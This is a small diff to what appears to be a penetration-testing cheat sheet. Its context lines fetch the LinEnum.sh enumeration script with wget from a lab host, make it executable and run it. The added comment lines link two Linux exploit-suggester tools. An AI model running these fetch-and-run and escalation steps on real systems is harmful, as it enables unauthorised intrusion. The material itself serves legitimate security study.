@@ -229,6 +229,12 @@ wget http://10.11.0.xx/LinEnum.sh
 #make this executable
 chmod +x LinEnum.sh
 ./LinEnum.sh
+
+#now we probably want to find some vulns as well
+
+#https://github.com/belane/linux-soft-exploit-suggester
+#https://github.com/mzet-/linux-exploit-suggester
+
 #######################################################################################
 #######################################################################################
 ################################## CRACKING ###########################################
